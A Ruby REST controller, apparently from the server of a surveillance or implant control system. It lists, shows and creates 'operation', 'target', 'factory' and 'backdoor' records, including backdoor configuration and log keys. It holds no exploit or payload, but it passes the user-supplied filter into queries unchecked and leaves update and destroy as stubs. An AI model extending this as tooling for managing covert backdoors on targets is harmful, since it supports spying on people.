#
# Controller for Items
#


module RCS
module DB

class ItemController < RESTController
  
  def index
    require_auth_level :admin, :tech, :view
    
    puts @session[:accessible]

    filter = {}
    filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'
    
    mongoid_query do
      filtering = ::Item.any_in(_id: @session[:accessible])
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end
      
      items = filtering.only(:name, :desc, :status, :_kind, :_path, :stat)
      RESTController.reply.ok(items)
    end
  end
  
  def show
    require_auth_level :admin, :tech, :view
    
    return RESTController.reply.not_found unless @session[:accessible].include? BSON::ObjectId.from_string(@params['_id'])
    
    mongoid_query do
      item = ::Item.find(@params['_id'])
      RESTController.reply.ok(item)
    end
  end
  
  def create
    # check they're asking to create a meaningful item
    return RESTController.reply.not_found unless ['operation', 'target', 'factory', 'backdoor'].include? @params['_kind']

    # enforce authorization levels
    require_auth_level :admin if ['operation', 'target'].include? @params['_kind']
    require_auth_level :tech if ['factory', 'backdoor'].include? @params['_kind']

    mongoid_query do
      item = Item.create(name: @params['name']) do |doc|
        # common fields
        doc[:desc] = @params['desc']
        doc[:status] = @params['status']
        doc[:_kind] = @params['_kind']
        
        operation = ::Item.find(@params['operation']) if @params.has_key? 'operation'
        target = ::Item.find(@params['target']) if @params.has_key? 'target'
        
        case doc[:_kind]
          when 'backdoor'
            doc[:_path] = [operation._id, target._id]
            doc[:stat] = Stat.new
            
            doc[:build] = @params['build']
            doc[:instance] = @params['instance']
            doc[:version] = @params['version']
            doc[:type] = @params['type']
            doc[:platform] = @params['platform']
            doc[:deleted] = @params['deleted']
            doc[:uninstalled] = @params['uninstalled']
            doc[:counter] = @params['counter']
            doc[:pathseed] = @params['pathseed']
            doc[:confkey] = @params['confkey']
            doc[:logkey] = @params['logkey']
            doc[:demo] = @params['demo']
            doc[:upgradable] = @params['upgradable']
          when 'factory'
            doc[:_path] = [operation._id, target._id]
          when 'target'
            doc[:_path] = [operation._id]
            doc[:stat] = Stat.new
          when 'operation'
            doc[:_path] = []
            doc[:stat] = Stat.new

            doc[:contact] = @params['contact']
        end
      end
      
      RESTController.reply.ok(item)
    end
  end

  def update

  end

  def destroy

  end
  
end

end #DB::
end #RCS::